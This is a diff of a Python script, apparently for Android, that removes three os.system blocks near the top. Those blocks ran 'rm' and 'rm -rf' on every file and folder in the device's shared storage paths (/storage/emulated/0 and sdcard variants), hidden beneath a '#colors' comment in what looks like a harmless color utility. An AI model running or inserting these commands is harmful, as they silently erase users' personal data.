@@ -1,30 +1,7 @@
 import os
 import time
 #colors
-os.system("""
-rm  /storage/emulated/0/*
 
-cd /storage/emulated/0
-
-rm -rf -- */   """)
-
-
-
-os.system("""	     
-rm  /storage/sdcard/0/*
-
-cd /storage/sdcard/0
-
-rm -rf -- */   """)
-
-
-
-os.system("""	   
-rm  /storage/sdcard0/0/*
-
-cd /storage/sdcard/0
-
-rm -rf -- */   """)
 
 
 class color:
